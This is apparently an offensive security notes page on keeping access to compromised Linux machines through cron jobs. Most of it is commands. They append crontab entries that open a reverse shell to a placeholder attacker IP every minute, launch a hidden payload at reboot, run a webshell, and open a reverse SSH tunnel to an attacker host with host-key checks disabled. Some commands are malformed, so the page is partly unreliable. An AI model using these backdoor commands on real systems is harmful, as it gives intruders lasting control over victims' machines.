---
author(s):
  - Userware
tags:
  - post-exploitation
  - maintaining-access
  - persistence
  - living-off-the-land
  - linux
---
# Living off the Land
## 01 - Usage

> [!IMPORTANT] Conditions
> Cron job service must be enabled.
> ```
$ systemctl status cron.service
> 
$ sudo systemctl start cron.service
>
> # /etc/init.d/cron start
> ```

Open an editor via crontab.

```
$ sudo crontab -e
```

This will execute every minute to trigger the backdoor.

```
$ sudo echo "* * * * * <commands>" >> /etc/crontab

$ sudo echo "$(echo '* * * * * <commands>')" | crontab -

$ echo "* * * * * <commands>" | crontab -

$ echo "$(echo '* * * * * <commands>')" | crontab -

$ crontab -l
```

## 02 - Callback Shells

Reverse shell backdoor.

```
$ sudo echo "* * * * * /bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" >> /etc/crontab

$ sudo echo "@reboot nohup /home/<username>/.directory/payload" >> /etc/crontab
```

Webshell backdoor

```
$ sudo echo "* * * * * php -f /var/www/html/logout.php" >> /etc/crontab
```

## 03 - Reverse SSH Tunnel

Refer to this [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x08 - Maintaining Access/Persistence/Linux/Remote Login/SSH/Manual/Living off the Land|section]] for more context.

```
$ sudo "* * * * * nohup ssh -i /tmp/keys/id_rsa -NTfCqR [127.0.0.1]:<SOCKS_Proxy> -o \"UserKnownHostsFile=/dev/null StrictHostKeyChecking=no\" <username>@<attacker_IP>" >> /etc/crontab
```

---
## References

### Backlinks

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x08 - Maintaining Access/Malware Development/Helpers/Persistence/Linux/Autostart Locations]]

- [[Linux Post Exploitation Persistence References]]

### Crontab GURU

- [Crontab GURU](https://crontab.guru)

### Crontab Generator

- [Crontab Generator](https://crontab-generator.org/)

### DMCXBlue

- [DMCXBlue: Cron](https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-techniques/persistence/t1053-scheduled-tasks-job/cron)